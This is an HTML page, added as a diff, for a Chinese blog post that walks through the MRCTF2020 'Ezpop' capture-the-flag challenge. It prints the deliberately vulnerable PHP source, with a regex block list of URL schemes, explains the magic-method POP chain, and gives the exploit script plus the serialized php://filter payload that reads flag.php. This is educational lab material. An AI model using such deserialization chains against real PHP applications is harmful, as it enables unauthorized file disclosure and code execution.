@@ -1,0 +1,409 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>php反序列化——pop链2 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-03-28">2021-03-28</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">php反序列化——pop链2</h2>
+            <div class="post-meta">
+                emm... 4435 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天再复习一道php反序列化的题目，锻炼自己构造pop链的能力。  </p>
+<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>打开题目，直接就得到了源码。  </p>
+<pre><code> &lt;?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier &#123;
+protected  $var;
+public function append($value)&#123;
+    include($value);
+&#125;
+public function __invoke()&#123;
+    $this-&gt;append($this-&gt;var);
+&#125;
+&#125;
+
+class Show&#123;
+public $source;
+public $str;
+public function __construct($file=&#39;index.php&#39;)&#123;
+    $this-&gt;source = $file;
+    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+&#125;
+public function __toString()&#123;
+    return $this-&gt;str-&gt;source;
+&#125;
+
+public function __wakeup()&#123;
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+&#125;
+
+class Test&#123;
+public $p;
+public function __construct()&#123;
+    $this-&gt;p = array();
+&#125;
+
+public function __get($key)&#123;
+    $function = $this-&gt;p;
+    return $function();
+&#125;
+
+
+if(isset($_GET[&#39;pop&#39;]))&#123;
+@unserialize($_GET[&#39;pop&#39;]);
+&#125;
+else&#123;
+$a=new Show;
+highlight_file(__FILE__);
+&#125;   </code></pre>
+<p>代码很长，但是根据我们之前做题的思路，首先就是找到可以执行命令的代码或者函数。  </p>
+<p>可以看到在Modifier类中就有一个include()函数，推测我们可以用这个函数来执行include()文件包含漏洞。  </p>
+<pre><code>class Modifier &#123;
+protected  $var;
+public function append($value)&#123;
+    include($value);
+&#125;
+public function __invoke()&#123;
+    $this-&gt;append($this-&gt;var);
+&#125;
+&#125;  </code></pre>
+<p>可以看到，include()函数里的变量$value是在下面的_invoke()方法中被赋值的，从之前的那道题目中可以知道，如果把一个类的对象当作函数调用，那么就会触发invoke()方法，而这个方法会调用一个自定义的方法，将把保护属性$var传入自定义方法append($value)，也就是将var的值赋予value，所以我们要想执行include()函数，就要给var传入参数。  </p>
+<p>那么我们如何触发_invoke()方法呢？这里我们可以看到下面的test类里有可用的函数。  </p>
+<pre><code>class Test&#123;
+public $p;
+function __construct()&#123;
+$this-&gt;p = array();
+&#125;
+
+public function __get($key)&#123;
+$function = $this-&gt;p;
+return $function();
+&#125;  </code></pre>
+<p>很明显，在Test类里的_get()方法会将p的值赋予$function并返回形如函数的形式$function()，而get()方法只会在访问不可访问或者不存在的属性的时候才会触发那么从哪里找一个不存在的属性呢？  </p>
+<p>这就要看到Show类了。</p>
+<pre><code>class Show&#123;
+public $source;
+public $str;
+public function __construct($file=&#39;index.php&#39;)&#123;
+    $this-&gt;source = $file;
+    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+&#125;
+public function __toString()&#123;
+    return $this-&gt;str-&gt;source;
+&#125;
+
+public function __wakeup()&#123;
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+&#125;</code></pre>
+<p>首先可以看到的是这个wakeup()方法，在反序列化开始的时候就会调用这个函数，而这个函数里又有一个正则匹配，匹配的是属性source，<strong>在这里要注意一下，在正则匹配时，是把属性source当作字符串来处理的。</strong>这让我们很容易就联系到上面的tostring_()方法，当一个类对象被当作字符串处理的时候，这个方法就会被返回。这里返回的$this-&gt;str-&gt;source;指的是返回str属性值的source属性，而这个source属性不正好就是Test类里没有的属性吗？  </p>
+<p>所以到了这里我们大致就可以理出pop链了：  </p>
+<p>我们首先从Show类开始，先触发wakeup方法，在wakeup的正则匹配中触发tostring方法，我们给str赋值Test()类，这样返回的就是Test类的source属性，而Test类里没有该属性，从而触发了get()方法，在get方法中我们给p赋值为Modifier类，这样最后返回的就是Modifier()，这样就是把类对象当作函数了，从而可以触发invoke()方法，而我们通过上传var参数来利用include()的文件包含漏洞。  </p>
+<pre><code>unserialize()--&gt;__wakeup()--&gt;toString()--&gt;__get()--&gt;__invoke()--&gt;append()--&gt;include()  </code></pre>
+<p>我们这样构造  </p>
+<pre><code>&lt;?php
+class Modifier &#123;
+protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//伪协议利用include()函数漏洞。
+
+&#125;
+
+class Test&#123;
+public $p;    
+&#125;
+
+class Show&#123;
+public $source;
+public $str;
+public function __construct()&#123;
+    $this-&gt;str = new Test();
+&#125;
+&#125;
+
+$a = new Show();
+$a-&gt;source = new Show();//这里是一个要注意的点，因为tostring()是在wakeup()方法中触发的，而这时匹配的是$source,所以我们要给source赋值show()类以此来进行接下来的tostring()方法。
+$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get返回的p触发__invoke
+echo serialize($a);
+?&gt;
+得到O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot; * var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</code></pre>
+<p>由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出<br>最后传入pop得到base64编码，解码即得flag。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"><img src="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"></a>  </p>
+<p>解码可得。  </p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题目虽然代码大变样，但是思路不变，依旧是找可以执行命令的语句和能够操控的pop链，只要对魔术方法足够了解，代码审计能力足够强就可以做到。所以说还是要多加练习啊。</p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
